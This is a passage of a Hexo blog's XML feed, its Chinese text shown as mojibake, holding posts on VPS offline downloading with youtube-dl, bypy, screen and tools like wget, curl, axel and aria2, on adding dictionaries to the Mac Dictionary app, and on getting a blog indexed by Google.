åˆ°ç™¾åº¦äº‘çš„æ–‡ä»¶å…¨éƒ¨å­˜æ”¾åœ¨â€œæˆ‘çš„åº”ç”¨æ•°æ® â€“&gt; bypyâ€è·¯å¾„ä¸‹ã€‚</p><h2 id="4-ä¸‹è½½ä¸ä¸Šä¼ è§†é¢‘"><a href="#4-ä¸‹è½½ä¸ä¸Šä¼ è§†é¢‘" class="headerlink" title="4 ä¸‹è½½ä¸ä¸Šä¼ è§†é¢‘"></a>4 ä¸‹è½½ä¸ä¸Šä¼ è§†é¢‘</h2><p>åœ¨Puttyå‘½ä»¤è¡Œç•Œé¢ä¸­åˆ›å»ºä¸€ä¸ªä¸“é—¨çš„ç›®å½•ç”¨äºå­˜æ”¾ä¸‹è½½çš„è§†é¢‘æ–‡ä»¶ï¼Œç„¶åCDè‡³æ­¤ç›®å½•ä¸‹ï¼Œåˆ›å»ºä¸€ä¸ªåŒ…å«æ‰€æœ‰ä¸‹è½½é“¾æ¥çš„txtæ–‡ä»¶ï¼ˆä½¿ç”¨viå‘½ä»¤å³å¯ï¼‰ã€‚åœ¨æ­¤ç›®å½•ä¸‹ï¼Œæ‰§è¡Œä¸‹è½½å‘½ä»¤ï¼š</p><p><code>youtube-dl -c -i -a video_url.txt</code></p><p>å‘ƒï¼Œçœ¼å°–çš„ä½ å¯èƒ½å·²ç»å‘ç°äº†ï¼Œä¸Šé¢è¿™æ¡å‘½ä»¤å¥½åƒå¤šå‡ºäº†ä¸¤ä¸ªå‚æ•°ï¼Ÿæ²¡é”™ï¼Œyoutube-dlæä¾›äº†å¾ˆå¤šæœ‰ç”¨çš„é™„åŠ å‚æ•°ï¼Œè¿™é‡Œç”¨åˆ°çš„æ˜¯ï¼š</p><p>-c æ–­ç‚¹ç»­ä¼ ï¼ˆå¦‚æœç”±äºæ„å¤–åŸå› ä¸‹è½½ä¸­æ–­äº†ï¼Œå†æ¬¡å¯åŠ¨ä¸‹è½½å‘½ä»¤æ—¶ï¼Œå¯ä»¥å®ç°æ–­ç‚¹ç»­ä¼ ï¼‰<br>-i å¿½ç•¥æŠ¥é”™ï¼ˆå¦‚æœå‡ºç°æŸäº›é“¾æ¥æ— æ³•æ‰“å¼€æˆ–è€…ä¸‹è½½çš„é—®é¢˜ï¼Œä¼šè‡ªåŠ¨ç»•è¿‡ï¼Œç»§ç»­ä¸‹è½½å…¶ä»–è§†é¢‘ï¼‰<br>ä¸‹è½½çš„è¯ä¸€èˆ¬å¾ˆå¿«ï¼Œä½†æ˜¯ä¸Šä¼ åˆ°ç™¾åº¦äº‘å¹¶æ²¡æœ‰é‚£ä¹ˆå¿«ã€‚ä¸ºäº†é˜²æ­¢å…³é—­Puttyçª—å£åï¼Œä¸‹è½½/ä¸Šä¼ è¿›ç¨‹å°±æ–­æ‰äº†ï¼Œå¯ä»¥è€ƒè™‘ä½¿ç”¨Screenè¿œç¨‹ä¼šè¯ç®¡ç†åŠŸèƒ½ã€‚ç®€å•ä»‹ç»å°±æ˜¯ï¼Œæœ‰äº†è¿™ç©æ„å„¿ï¼Œä½ å¯ä»¥åœ¨Puttyä¸­å¯åŠ¨ä¸‹è½½æˆ–è€…ä¸Šä¼ è¿›ç¨‹ï¼Œè®©å…¶åœ¨åå°è¿è¡Œï¼Œç„¶åå…³æ‰Puttyç¦»å¼€ç”µè„‘æ—è¯¥å¹²å•¥å¹²å•¥å»ï¼Œæœ‰éœ€è¦çš„è¯å›æ¥é‡æ–°æ‰“å¼€çª—å£å°±å¯ä»¥çœ‹åˆ°è¿›ç¨‹ä¾ç„¶åœ¨è·‘ã€‚</p><p>è¦æ£€æŸ¥æ“ä½œç³»ç»Ÿæ˜¯å¦æ”¯æŒscreenï¼Œå¯ä»¥ç›´æ¥è¾“å…¥screenç„¶åå›è½¦ï¼Œå¦‚æœæç¤ºæ‰¾ä¸åˆ°è¿™ä¸ªå‘½ä»¤ï¼Œé‚£å°±æ˜¯ç³»ç»Ÿè¿˜æ²¡å®‰è£…å¥½è¿™ä¸ªä¸œè¥¿ã€‚åœ¨CentOS 7ä¸­å®‰è£…screenå¾ˆç®€å•ï¼Œä¸€æ¡å‘½ä»¤è€Œå·²ï¼š</p><p><code>yum install screen</code></p><p>å®‰è£…å®Œæ¯•åï¼Œè¾“å…¥ screen -S sessionname å³å¯åˆ›å»ºä¸€ä¸ªåä¸º sessionname çš„screenä¼šè¯çª—å£ã€‚åœ¨æ­¤çª—å£ä¸­æ‰§è¡Œæƒ³è¦åšçš„ä»»åŠ¡ï¼Œç„¶ååŒæ—¶æŒ‰ä¸‹ ctrl + aï¼Œæ¾å¼€åæŒ‰ä¸‹ dï¼Œå³å¯å°†æ­¤sessionæ”¾åˆ°åå°å»è¿è¡Œï¼Œå¹¶å›åˆ°ä¹‹å‰çš„å¯¹è¯çª—å£ã€‚åœ¨éscreenå¯¹è¯çª—å£ä¸­ï¼Œè¾“å…¥ screen -ls å¯ä»¥åˆ—ä¸¾å·²æœ‰çš„screenè¿›ç¨‹ã€‚è¾“å…¥ â€œscreen -r è¿›ç¨‹ä»£ç â€ å°±å¯ä»¥å†æ¬¡è°ƒå‡ºæ­£åœ¨è¿è¡Œçš„screenè¿›ç¨‹ã€‚</p><p>ç”±äºæˆ‘è¦ä¸Šä¼ åˆ°ç™¾åº¦äº‘çš„æ–‡ä»¶å¤ªå¤šäº†ï¼Œæˆ‘ä¸å¯èƒ½å®ˆåœ¨ç”µè„‘å‰ç­‰å®ƒå®Œæˆæ‰€æœ‰ä»»åŠ¡ï¼Œæ‰€ä»¥screenè¿™ä¸ªåŠŸèƒ½è¿˜æ˜¯éå¸¸å®ç”¨çš„ã€‚</p><p>æœ¬æ–‡ä¸»è¦å‚è€ƒé“¾æ¥ï¼š<br><a href="https://github.com/rg3/youtube-dl/" target="_blank" rel="noopener">https://github.com/rg3/youtube-dl/</a><br><a href="https://github.com/houtianze/bypy" target="_blank" rel="noopener">https://github.com/houtianze/bypy</a><br><a href="http://yesido.info/2015/03/linux-upload-document-to-baidu-cloud/ï¼ˆç¼–è€…æŒ‰ï¼šé“¾æ¥å·²å¤±æ•ˆï¼‰" target="_blank" rel="noopener">http://yesido.info/2015/03/linux-upload-document-to-baidu-cloud/ï¼ˆç¼–è€…æŒ‰ï¼šé“¾æ¥å·²å¤±æ•ˆï¼‰</a></p></blockquote><p>åŸæ–‡é“¾æ¥ï¼š<a href="http://www.typemylife.com/use-vps-download-videos-from-youtube-upload-to-baidu-cloud/" target="_blank" rel="noopener">http://www.typemylife.com/use-vps-download-videos-from-youtube-upload-to-baidu-cloud/</a></p>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸æŠ€æœ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç¦»çº¿ä¸‹è½½ </tag>
            
            <tag> VPS </tag>
            
            <tag> ç™¾åº¦äº‘ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VPSç¦»çº¿ä¸‹è½½ä¹‹ä¸€</title>
      <link href="/post/vps-download-part-I/"/>
      <url>/post/vps-download-part-I/</url>
      
        <content type="html"><![CDATA[<p>æœ‰ä¸€å°VPSå¯ä»¥åšå„ç§å„æ ·å¥½ç©å„¿çš„ä¸œè¥¿ï¼Œè¿™ä¸ï¼Œæ¥¼ä¸»å¼€å§‹æŠ˜è…¾ç¦»çº¿ä¸‹è½½äº†ã€‚</p><a id="more"></a><h1 id="ç¦»çº¿ä¸‹è½½æ¦‚è¿°"><a href="#ç¦»çº¿ä¸‹è½½æ¦‚è¿°" class="headerlink" title="ç¦»çº¿ä¸‹è½½æ¦‚è¿°"></a>ç¦»çº¿ä¸‹è½½æ¦‚è¿°</h1><p>æ—¢ç„¶æˆ‘ä»¬è¦ä½¿ç”¨æœåŠ¡å™¨ç¦»çº¿ä¸‹è½½ï¼Œé¦–å…ˆæ¥äº†è§£ä¸€ä¸‹ç¦»çº¿ä¸‹è½½çš„åŸç†ï¼š<br><img src="https://tva1.sinaimg.cn/large/0082zybply1gc0qy9asyzj30os0deta6.jpg" alt="ç¦»çº¿ä¸‹è½½"></p><p>é‚£ä¹ˆç¦»çº¿ä¸‹è½½æœ‰ä»€ä¹ˆä¼˜åŠ¿å‘¢ï¼Ÿ</p><ol><li>å¯¹äºä¸€äº›æ…¢é€Ÿçš„å¤§æ–‡ä»¶ï¼Œå¯ä»¥æ‰”åˆ°æœåŠ¡å™¨ä¸Šæ…¢æ…¢ä¸‹ï¼Œä¸‹å¥½äº†å†å–å›æœ¬åœ°ï¼Œé¿å…é•¿æ—¶é—´çš„ç­‰å¾…ï¼›</li><li>å¦‚æœä½ çš„vpsä½äºå›½å¤–ï¼Œæœ‰äº›èµ„æºçš„ä¸‹è½½vpsé€Ÿåº¦æ›´å¿«ï¼Œæœ¬åœ°ä½ å¯èƒ½è€—æ—¶ä¸€æ•´å¤©éƒ½ä¸ä¸€å®šèƒ½ä¸‹å®Œï¼Œå°±ç®—ä¸‹å®Œäº†ä¹Ÿå¯èƒ½æ˜¯ä¸€ä¸ªæŸåçš„æ–‡ä»¶åŒ…ï¼Œè€Œvpså‡ ä¹å¯ä»¥åšåˆ°ç§’ä¸‹ï¼Œç„¶åå°†ä¸‹è½½å¥½çš„èµ„æºåŒæ­¥åˆ°å›½å†…çš„ç™¾åº¦äº‘ï¼Œè¿™æ ·ç»•ä¸ªå¼¯å­ä¼šèŠ‚çœä¸å°‘çš„æ—¶é—´ã€‚</li></ol><h1 id="ç¦»çº¿ä¸‹è½½æ–¹å¼"><a href="#ç¦»çº¿ä¸‹è½½æ–¹å¼" class="headerlink" title="ç¦»çº¿ä¸‹è½½æ–¹å¼"></a>ç¦»çº¿ä¸‹è½½æ–¹å¼</h1><p>åœ¨Linuxç³»ç»Ÿä¸­æœ‰è¿™æ ·å‡ ç§å‘½ä»¤è¡Œä¸‹è½½æ–¹å¼ï¼š</p><h3 id="1-wget"><a href="#1-wget" class="headerlink" title="1. wget"></a>1. wget</h3><p>wgetå‘½ä»¤ç”¨æ¥ä»æŒ‡å®šçš„URLä¸‹è½½æ–‡ä»¶ã€‚wgetéå¸¸ç¨³å®šï¼Œå®ƒåœ¨å¸¦å®½å¾ˆçª„çš„æƒ…å†µä¸‹å’Œä¸ç¨³å®šç½‘ç»œä¸­æœ‰å¾ˆå¼ºçš„é€‚åº”æ€§ï¼Œå¦‚æœæ˜¯ç”±äºç½‘ç»œçš„åŸå› ä¸‹è½½å¤±è´¥ï¼Œwgetä¼šä¸æ–­çš„å°è¯•ï¼Œç›´åˆ°æ•´ä¸ªæ–‡ä»¶ä¸‹è½½å®Œæ¯•ã€‚å¦‚æœæ˜¯æœåŠ¡å™¨æ‰“æ–­ä¸‹è½½è¿‡ç¨‹ï¼Œå®ƒä¼šå†æ¬¡è”åˆ°æœåŠ¡å™¨ä¸Šä»åœæ­¢çš„åœ°æ–¹ç»§ç»­ä¸‹è½½ã€‚è¿™å¯¹ä»é‚£äº›é™å®šäº†é“¾æ¥æ—¶é—´çš„æœåŠ¡å™¨ä¸Šä¸‹è½½å¤§æ–‡ä»¶éå¸¸æœ‰ç”¨ã€‚</p><h3 id="2-curl"><a href="#2-curl" class="headerlink" title="2. curl"></a>2. curl</h3><p>curlå‘½ä»¤æ˜¯ä¸€ä¸ªåˆ©ç”¨URLè§„åˆ™åœ¨å‘½ä»¤è¡Œä¸‹å·¥ä½œçš„æ–‡ä»¶ä¼ è¾“å·¥å…·ã€‚å®ƒæ”¯æŒæ–‡ä»¶çš„ä¸Šä¼ å’Œä¸‹è½½ï¼Œæ‰€ä»¥æ˜¯ç»¼åˆä¼ è¾“å·¥å…·ï¼Œä½†æŒ‰ä¼ ç»Ÿï¼Œä¹ æƒ¯ç§°curlä¸ºä¸‹è½½å·¥å…·ã€‚ä½œä¸ºä¸€æ¬¾å¼ºåŠ›å·¥å…·ï¼Œcurlæ”¯æŒåŒ…æ‹¬HTTPã€HTTPSã€ftpç­‰ä¼—å¤šåè®®ï¼Œè¿˜æ”¯æŒPOSTã€cookiesã€è®¤è¯ã€ä»æŒ‡å®šåç§»å¤„ä¸‹è½½éƒ¨åˆ†æ–‡ä»¶ã€ç”¨æˆ·ä»£ç†å­—ç¬¦ä¸²ã€é™é€Ÿã€æ–‡ä»¶å¤§å°ã€è¿›åº¦æ¡ç­‰ç‰¹å¾ã€‚</p><h3 id="3-axel"><a href="#3-axel" class="headerlink" title="3. axel"></a>3. axel</h3><p>axelæ˜¯Linuxä¸‹ä¸€ä¸ªä¸é”™çš„HTTP/ftpé«˜é€Ÿä¸‹è½½å·¥å…·ã€‚æ”¯æŒå¤šçº¿ç¨‹ä¸‹è½½ã€æ–­ç‚¹ç»­ä¼ ï¼Œä¸”å¯ä»¥ä»å¤šä¸ªåœ°å€æˆ–è€…ä»ä¸€ä¸ªåœ°å€çš„å¤šä¸ªè¿æ¥æ¥ä¸‹è½½åŒä¸€ä¸ªæ–‡ä»¶ã€‚é€‚åˆç½‘é€Ÿä¸ç»™åŠ›æ—¶å¤šçº¿ç¨‹ä¸‹è½½æé«˜ä¸‹è½½é€Ÿåº¦ã€‚æ¯”å¦‚åœ¨å›½å†…VPSæˆ–æœåŠ¡å™¨ä¸Šä¸‹è½½lnmpä¸€é”®å®‰è£…åŒ…ç”¨Axelå°±æ¯”wgetå¿«ã€‚</p><h3 id="4-aria2"><a href="#4-aria2" class="headerlink" title="4. aria2"></a>4. aria2</h3><p>Aria2æ˜¯ä¸€ä¸ªåŸºäºå‘½ä»¤è¡Œçš„å¼€æºä¸‹è½½å·¥å…·ï¼Œæ”¯æŒå¤šåè®®ã€å¤šæ¥æº(HTTP/HTTPSã€FTPã€BitTorrentã€Metalinkåè®®ç­‰)ã€å¤šçº¿ç¨‹çš„ä¸‹è½½ã€‚å®ƒæ¯”axelä¼˜ç§€çš„åœ°æ–¹åœ¨äºå®Œå…¨æ”¯æŒBitTorrentåè®®ï¼ŒåŒæ—¶å¯ä»¥ä½œä¸ºBitTorrentå®¢æˆ·ç«¯æ¥ä¸‹è½½ç§å­æ–‡ä»¶,æ”¯æŒMetalinkåè®®,è¿œç¨‹æ§åˆ¶(é€šè¿‡webç«¯)ä¸‹è½½è¿›ç¨‹ã€‚</p><p>ä¸»è¦ä¼˜åŠ¿å¦‚ä¸‹ï¼š</p><ul><li>é«˜é€Ÿï¼Œè‡ªåŠ¨å¤šçº¿ç¨‹ä¸‹è½½ï¼›</li><li>æ–­ç‚¹ç»­ä¼ ï¼›</li><li>è½»é‡å ç”¨å†…å­˜éå¸¸å°‘ï¼Œé€šå¸¸æƒ…å†µå¹³å‡4~9MBå†…å­˜å ç”¨(å®˜æ–¹ä»‹ç»)ï¼›</li><li>å¤šå¹³å°ã€‚æ”¯æ´ Win/Linux/OSX/Android ç­‰æ“ä½œç³»ç»Ÿä¸‹çš„éƒ¨ç½²ï¼›</li><li>æ¨¡å—åŒ–ã€‚åˆ†æ®µä¸‹è½½å¼•æ“ï¼Œæ–‡ä»¶æ•´åˆé€Ÿåº¦å¿«ï¼›</li><li>æ”¯æŒRPCç•Œé¢è¿œç¨‹ï¼›</li><li>å…¨é¢æ”¯æŒBitTorrentåè®®ï¼›</li></ul><p>Aria2å®˜æ–¹é¡¹ç›®é¡µé¢ï¼š<a href="https://aria2.github.io/" target="_blank" rel="noopener">https://aria2.github.io/</a></p><p>å…³äºAria2çš„å®‰è£…å’Œä½¿ç”¨æ•™ç¨‹è¯·å‚è§ï¼š<a href="http://www.hi-linux.com/2016/05/09/CentOS%E4%B8%8B%E6%90%AD%E5%BB%BAAria2%E8%BF%9C%E7%A8%8B%E4%B8%8B%E8%BD%BD%E7%8E%AF%E5%A2%83/" target="_blank" rel="noopener">CentOSä¸‹æ­å»ºAria2è¿œç¨‹ä¸‹è½½ç¯å¢ƒ</a></p><h3 id="5-å„ç§ä¸‹è½½å·¥å…·çš„æ¯”è¾ƒ"><a href="#5-å„ç§ä¸‹è½½å·¥å…·çš„æ¯”è¾ƒ" class="headerlink" title="5. å„ç§ä¸‹è½½å·¥å…·çš„æ¯”è¾ƒ"></a>5. å„ç§ä¸‹è½½å·¥å…·çš„æ¯”è¾ƒ</h3><table><thead><tr><th align="center">åè®®</th><th align="center">wget</th><th align="center">curl</th><th align="center">axel</th><th align="center">aria</th></tr></thead><tbody><tr><td align="center">HTTP(S)</td><td align="center">âœ“</td><td align="center">âœ“</td><td align="center">âœ“</td><td align="center">âœ“</td></tr><tr><td align="center">FTP</td><td align="center">âœ“</td><td align="center">âœ“</td><td align="center">âœ“</td><td align="center">âœ“</td></tr><tr><td align="center">SFTP</td><td align="center">âœ—</td><td align="center">âœ“</td><td align="center">âœ—</td><td align="center">âœ—</td></tr><tr><td align="center">BitTorrent</td><td align="center">âœ—</td><td align="center">âœ—</td><td align="center">âœ—</td><td align="center">âœ“</td></tr><tr><td align="center">Metalink</td><td align="center">âœ—</td><td align="center">âœ—</td><td align="center">âœ—</td><td align="center">âœ“</td></tr><tr><td align="center">Telnet</td><td align="center">âœ—</td><td align="center">âœ“</td><td align="center">âœ—</td><td align="center">âœ—</td></tr><tr><td align="center">IMAP</td><td align="center">âœ—</td><td align="center">âœ“</td><td align="center">âœ—</td><td align="center">âœ—</td></tr><tr><td align="center">POP3</td><td align="center">âœ—</td><td align="center">âœ“</td><td align="center">âœ—</td><td align="center">âœ—</td></tr><tr><td align="center">SMTP</td><td align="center">âœ—</td><td align="center">âœ“</td><td align="center">âœ—</td><td align="center">âœ—</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸æŠ€æœ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç¦»çº¿ä¸‹è½½ </tag>
            
            <tag> aria2 </tag>
            
            <tag> wget </tag>
            
            <tag> curl </tag>
            
            <tag> axel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¢å¼ºä½ çš„Macè¯å…¸</title>
      <link href="/post/enhance-mac-dicts/"/>
      <url>/post/enhance-mac-dicts/</url>
      
        <content type="html"><![CDATA[<p>Macè‡ªå¸¦çš„è¯å…¸åŠŸèƒ½è¿œæ¯”ä½ æƒ³è±¡çš„å¼ºå¤§,ä½ å®Œå…¨å¯ä»¥è‡ªå®šä¹‰ä½ çš„è¯å…¸ã€‚</p><a id="more"></a><p>Macè‡ªå¸¦çš„è¯å…¸åŠŸèƒ½ï¼Œä¸ä»…èƒ½ç”¨ä¸‰æŒ‡è½»è§¦æŸ¥è¯¢ï¼Œå¦‚æœä½ å¯¹è¯å…¸ä¸æ»¡æ„ï¼Œè¿˜å¯ä»¥è‡ªå·±æ·»åŠ è¯å…¸ï¼Œå¦‚ç‰›æ´¥ã€æœ—æ–‡ã€è‹±æ±‰ã€æ±‰è‹±ã€æ³•æ±‰ã€å¾·æ±‰ã€æ±‰æ³•ã€æ±‰å¾·ã€æ—¥æ±‰ã€æ±‰æ—¥ï¼›ç”šè‡³åº·ç†™å¤§è¾å…¸ï¼Œä»¥åŠæ¹˜é›…åŒ»å­¦ä¸“ä¸šè¯å…¸ã€‚åªè¦ä½ èƒ½æ‰¾åˆ°åˆé€‚çš„è¯å…¸åŒ…å³å¯ã€‚æ‰€ä»¥å®Œå…¨æ²¡æœ‰å¿…è¦å®‰è£…æœ‰é“è¯å…¸ç­‰ç¬¬ä¸‰æ–¹è¯å…¸ã€‚</p><h3 id="1-ä¸‹è½½è¯å…¸è½¬æ¢å·¥å…·"><a href="#1-ä¸‹è½½è¯å…¸è½¬æ¢å·¥å…·" class="headerlink" title="1 ä¸‹è½½è¯å…¸è½¬æ¢å·¥å…·"></a>1 ä¸‹è½½è¯å…¸è½¬æ¢å·¥å…·</h3><p>DictUnifierä¸‹è½½åœ°å€ï¼š<a href="https://github.com/jjgod/mac-dictionary-kit" target="_blank" rel="noopener">https://github.com/jjgod/mac-dictionary-kit</a></p><h3 id="2-ä¸‹è½½è¯å…¸åŒ…"><a href="#2-ä¸‹è½½è¯å…¸åŒ…" class="headerlink" title="2 ä¸‹è½½è¯å…¸åŒ…"></a>2 ä¸‹è½½è¯å…¸åŒ…</h3><p>è¯å…¸åŒ…ä¸‹è½½åœ°å€ï¼š<a href="http://abloz.com/huzheng/stardict-dic/zh_CN/" target="_blank" rel="noopener">http://abloz.com/huzheng/stardict-dic/zh_CN/</a></p><h3 id="3-è¯å…¸è½¬æ¢"><a href="#3-è¯å…¸è½¬æ¢" class="headerlink" title="3 è¯å…¸è½¬æ¢"></a>3 è¯å…¸è½¬æ¢</h3><p>æ‰“å¼€DictUnifierï¼Œç„¶åå°†ä¸‹è½½å¥½çš„è¯å…¸åŒ…æ‹–æ‹½åˆ°DictUnifierä¸­ï¼ŒæŒ‰ç…§æç¤ºæ“ä½œå³å¯ã€‚</p><p>ä¸€èˆ¬æ¥è¯´ï¼Œè¯å…¸åŒ…å®‰è£…åï¼ŒDictionaryä¼šè‡ªåŠ¨æ‰“å¼€ï¼Œè¿™æ—¶ä½ å°±ä¼šå‘ç°æ–°å¢çš„è¯å…¸äº†ã€‚</p><p>ç‰¹åˆ«æé†’ï¼šæœ‰äº›Mac OSç‰ˆæœ¬ï¼Œéœ€è¦åœ¨Dictionaryçš„åå¥½è®¾ç½®é‡Œé¢ï¼ˆcommandåŠ é€—å·ï¼‰ï¼ŒæŠŠéœ€è¦çš„è¯å…¸å‹¾é€‰ä¸€ä¸‹ï½</p><h3 id="4-åˆ é™¤è¯å…¸"><a href="#4-åˆ é™¤è¯å…¸" class="headerlink" title="4 åˆ é™¤è¯å…¸"></a>4 åˆ é™¤è¯å…¸</h3><p>å¯¹äºä¸æƒ³è¦çš„è¯å…¸ï¼š</p><ol><li>åœ¨Dictionaryç•Œé¢ä¸æ˜¾ç¤ºâ€”â€”åœ¨Dictionaryçš„â€œç³»ç»Ÿè®¾ç½®â€é‡Œé¢ï¼ŒæŠŠä¸æƒ³ç”¨çš„è¯å…¸å‰é¢çš„â€œå¯¹å‹¾â€å»æ‰</li><li>æƒ³å®Œå…¨åˆ å»â€”â€”åœ¨ä¸‹é¢è¿™ä¸¤ä¸ªæ–‡ä»¶å¤¹å†…ï¼Œæ‰¾åˆ°ç›¸åº”çš„.dictionaryæ–‡ä»¶ï¼Œdelete<ul><li>Macintosh HD/Library/Dictionariesæ–‡ä»¶å¤¹</li><li>Macintosh HD/Users/ä½ çš„ç”¨æˆ·å/Library/Dictionariesæ–‡ä»¶å¤¹</li></ul></li></ol><p>ä¸€ç¯‡è¯¦ç»†çš„è‹±æ–‡å‚è€ƒæ•™ç¨‹ï¼š<a href="https://davidtse916.wordpress.com/2008/01/24/adding-dictionaries-to-the-built-in-dictionary-application-in-leopard/" target="_blank" rel="noopener">https://davidtse916.wordpress.com/2008/01/24/adding-dictionaries-to-the-built-in-dictionary-application-in-leopard/</a></p><h3 id="å…¶ä»–è¯å…¸å·¥å…·æ¨è"><a href="#å…¶ä»–è¯å…¸å·¥å…·æ¨è" class="headerlink" title="å…¶ä»–è¯å…¸å·¥å…·æ¨è"></a>å…¶ä»–è¯å…¸å·¥å…·æ¨è</h3><p>GoldenDictæ˜¯ä¸€ä¸ªå¼€æºçš„è¯å…¸é¡¹ç›®ï¼Œå¯åœ¨Windowsã€Macã€Linuxå…¨å¹³å°ä¸‹ä½¿ç”¨ï¼Œè€Œä¸”æ”¯æŒä¸­æ–‡ï¼Œé¡¹ç›®ä¸»é¡µ<a href="https://github.com/goldendict/goldendict/wiki" target="_blank" rel="noopener">https://github.com/goldendict/goldendict/wiki</a></p><p>GoldenDictæ·»åŠ ç½‘ç»œè¯å…¸æ•™ç¨‹ï¼š<a href="https://www.shanbay.com/team/thread/34543/938905/" target="_blank" rel="noopener">https://www.shanbay.com/team/thread/34543/938905/</a></p><p>GoldenDictæ·»åŠ æœ¬åœ°è¯å…¸æ•™ç¨‹ï¼š<a href="http://jingyan.baidu.com/article/f25ef254459199482c1b829c.html" target="_blank" rel="noopener">http://jingyan.baidu.com/article/f25ef254459199482c1b829c.html</a></p><p>ä¸GoldenDictç±»ä¼¼çš„è¿˜æœ‰StarDictï¼Œä¸è¿‡è¯¥é¡¹ç›®å› ä¸ºç‰ˆæƒé—®é¢˜å·²ç»åœæ­¢ç»´æŠ¤äº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸æŠ€æœ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mac </tag>
            
            <tag> æ•ˆç‡ </tag>
            
            <tag> è¯å…¸ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¦‚ä½•è®©ä½ çš„åšå®¢è¢«Googleæ”¶å½•</title>
      <link href="/post/how-to-make-you-blog-included-by-google/"/>
      <url>/post/how-to-make-you-blog-included-by-google/</url>
      
        <content type="html"><![CDATA[<p>hexoæ­å»ºçš„åšå®¢å¿«é€Ÿè®©Googleæ”¶å½•æ•™ç¨‹</p><a id="more"></a><h3 id="1-æ³¨å†Œä¸€ä¸ªè°·æ­Œè´¦å·"><a href="#1-æ³¨å†Œä¸€ä¸ªè°·æ­Œè´¦å·" class="headerlink" title="1 æ³¨å†Œä¸€ä¸ªè°·æ­Œè´¦å·"></a>1 æ³¨å†Œä¸€ä¸ªè°·æ­Œè´¦å·</h3><p>æ‰“å¼€<a href="https://www.google.com/webmasters/tools/home?hl=zh-CN" target="_blank" rel="noopener">Googleæœç´¢å¼•æ“æäº¤å…¥å£</a></p><h3 id="2-ä¸‹è½½éªŒè¯æ–‡ä»¶"><a href="#2-ä¸‹è½½éªŒè¯æ–‡ä»¶" class="headerlink" title="2 ä¸‹è½½éªŒè¯æ–‡ä»¶"></a>2 ä¸‹è½½éªŒè¯æ–‡ä»¶</h3><p><img src="http://babymaychen.github.io/uploads/downloadCheck.png" alt="éªŒè¯æ–‡ä»¶"></p><p>ä¸‹è½½Googleçš„éªŒè¯æ–‡ä»¶ä¹‹åï¼Œéœ€è¦åœ¨æ–‡ä»¶å¼€å¤´æ·»åŠ layout: falseæ¥å–æ¶ˆhexoå¯¹å…¶è¿›è¡Œçš„è½¬æ¢ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">$</span> <span class="string">cat</span> <span class="string">source/google0b4c8a25b65d7c2a.html</span></span><br><span class="line"><span class="attr">layout:</span> <span class="literal">false</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">google-site-verification:</span> <span class="string">google0b4c8a25b65d7c2a.html</span></span><br></pre></td></tr></table></figure><h3 id="3-å°†éªŒè¯æ–‡ä»¶æ”¾å…¥ç½‘ç«™çš„æ ¹ç›®å½•"><a href="#3-å°†éªŒè¯æ–‡ä»¶æ”¾å…¥ç½‘ç«™çš„æ ¹ç›®å½•" class="headerlink" title="3 å°†éªŒè¯æ–‡ä»¶æ”¾å…¥ç½‘ç«™çš„æ ¹ç›®å½•"></a>3 å°†éªŒè¯æ–‡ä»¶æ”¾å…¥ç½‘ç«™çš„æ ¹ç›®å½•</h3><p>ä»¥GitHubä¸ºä¾‹ï¼Œæ‰“å¼€åšå®¢ä¸»é¡µï¼Œç‚¹å‡»â€Upload filesâ€ï¼Œå°†éªŒè¯æ–‡ä»¶æ”¾å…¥é¡¹ç›®æ ¹ç›®å½•</p><h3 id="4-è®¿é—®éªŒè¯æ–‡ä»¶"><a href="#4-è®¿é—®éªŒè¯æ–‡ä»¶" class="headerlink" title="4 è®¿é—®éªŒè¯æ–‡ä»¶"></a>4 è®¿é—®éªŒè¯æ–‡ä»¶</h3><p>ç„¶åæ‰“å¼€æµè§ˆå™¨è¾“å…¥ï¼šhttp://ä½ çš„ç½‘ç«™åŸŸå/ä½ ä¸‹è½½çš„éªŒè¯æ–‡ä»¶åå­—.html ï¼Œå¦‚æœä½ çœ‹åˆ°äº†ä¸€ä¸²å­—ç¬¦(æ³¨ï¼šåªæœ‰ä¸€ä¸²å­—ç¬¦)ï¼Œé‚£å°±æˆåŠŸäº†ã€‚</p><h3 id="5-æ·»åŠ ç«™ç‚¹åœ°å›¾"><a href="#5-æ·»åŠ ç«™ç‚¹åœ°å›¾" class="headerlink" title="5 æ·»åŠ ç«™ç‚¹åœ°å›¾"></a>5 æ·»åŠ ç«™ç‚¹åœ°å›¾</h3><p>ä»€ä¹ˆæ˜¯ç«™ç‚¹åœ°å›¾å‘¢ï¼ŸGoogleçš„è§£é‡Šæ˜¯:</p><blockquote><p>ç«™ç‚¹åœ°å›¾æ˜¯ä¸€ç§æ–‡ä»¶ï¼Œæ‚¨å¯ä»¥é€šè¿‡è¯¥æ–‡ä»¶åˆ—å‡ºæ‚¨ç½‘ç«™ä¸Šçš„ç½‘é¡µï¼Œä»è€Œå°†æ‚¨ç½‘ç«™å†…å®¹çš„ç»„ç»‡æ¶æ„å‘ŠçŸ¥Googleå’Œå…¶ä»–æœç´¢å¼•æ“ã€‚Googlebotç­‰æœç´¢å¼•æ“ç½‘é¡µæŠ“å–å·¥å…·ä¼šè¯»å–æ­¤æ–‡ä»¶ï¼Œä»¥ä¾¿æ›´åŠ æ™ºèƒ½åœ°æŠ“å–æ‚¨çš„ç½‘ç«™ã€‚</p></blockquote><p>å¯¹äºä½¿ç”¨Hexoå†™åšå®¢çš„å°ä¼™ä¼´æ¥è¯´ï¼Œå¯ä»¥ä½¿ç”¨ hexo-generator-sitemap æ’ä»¶æ¥ç”ŸæˆSitemapã€‚æ’ä»¶çš„ä½¿ç”¨å¾ˆç®€å•ï¼Œåªéœ€è¦ä¸‹è½½å³å¯ï¼š</p><p><code>npm install hexo-generator-sitemap 